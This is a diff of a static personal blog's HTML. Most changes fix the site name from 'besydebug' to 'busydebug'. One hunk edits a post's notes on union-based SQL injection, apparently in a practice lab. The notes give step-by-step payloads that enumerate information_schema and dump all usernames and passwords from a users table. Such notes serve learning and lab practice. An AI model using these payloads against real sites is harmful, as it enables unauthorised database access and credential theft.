@@ -130,12 +130,12 @@
 
 
 <meta property="og:type" content="website">
-<meta property="og:title" content="besydebug">
+<meta property="og:title" content="busydebug">
 <meta property="og:url" content="https://busydebug.github.io/index.html">
-<meta property="og:site_name" content="besydebug">
+<meta property="og:site_name" content="busydebug">
 <meta property="og:locale" content="en">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="besydebug">
+<meta name="twitter:title" content="busydebug">
 
 
 
@@ -171,7 +171,7 @@
 
 
 
-  <title>besydebug</title>
+  <title>busydebug</title>
   
 
 
@@ -202,7 +202,7 @@
     <div class="custom-logo-site-title">
       <a href="/"  class="brand" rel="start">
         <span class="logo-line-before"><i></i></span>
-        <span class="site-title">besydebug</span>
+        <span class="site-title">busydebug</span>
         <span class="logo-line-after"><i></i></span>
       </a>
     </div>
@@ -308,7 +308,7 @@
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="besydebug">
+      <meta itemprop="name" content="busydebug">
     </span>
 
     
@@ -468,7 +468,7 @@
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="besydebug">
+      <meta itemprop="name" content="busydebug">
     </span>
 
     
@@ -564,16 +564,16 @@
         
           
             <ul>
-<li>I test <code>?id=1&#39;</code>, then return a error message showing that the sql statement using single quote</li>
-<li>so i change the sql statement to <code>?id=1&#39; %23</code>, it runs normally</li>
+<li>I test <code>?id=1&#39;</code>, then return a error message showing that the SQL statement using single quotes</li>
+<li>so I change the SQL statement to <code>?id=1&#39; %23</code>, it runs normally</li>
 <li>then test <code>?id=1&#39; union select 1,2,3 %23</code>, but return nothing useful</li>
-<li>because id is valid so the union statement cannot run, so i change the sql statement to <code>?id=-1&#39; union select 1,2,3 %23</code>, yeah, it return different data, we can see that the server just uses position 2 and 3</li>
-<li>let me try more useful sql, <code>?id=-1&#39; union select 1,user(),database() %23</code>, we can see that we get the user name and database name</li>
-<li>using database name we can get its tables name through inner database <code>information_schema</code></li>
-<li>try <code>?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39; %23</code>, we get tables name of database <code>security</code></li>
-<li>to get more data, we can try getting data from table <code>users</code>, <code>?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; %23</code>, we get columns name of table <code>users</code> in database <code>security</code></li>
+<li>because id is valid so the union statement cannot run, so I change the SQL statement to <code>?id=-1&#39; union select 1,2,3 %23</code>, yeah, it return different data, we can see that the server just uses position 2 and 3</li>
+<li>let me try more useful SQL , <code>?id=-1&#39; union select 1,user(),database() %23</code>, we can see that we get the user name and database name</li>
+<li>using database name we can get its tables name through inner database <strong>information_schema</strong></li>
+<li>try <code>?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39; %23</code>, we get tables name of database <strong>security</strong></li>
+<li>to get more data, we can try getting data from table <strong>users</strong>, <code>?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; %23</code>, we get columns name of table users in database <strong>security</strong></li>
 <li>finally we use <code>?id=-1&#39; union select 1,group_concat(username, &#39;:&#39;),group_concat(password, &#39;:&#39;) from security.users %23</code>, we get all username and password</li>
-<li>i just make notes so i don’t explain clearly, i’m sorry</li>
+<li>I just make notes so I don’t explain clearly, I’m sorry</li>
 </ul>
 
           
@@ -632,7 +632,7 @@
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="besydebug">
+      <meta itemprop="name" content="busydebug">
     </span>
 
     
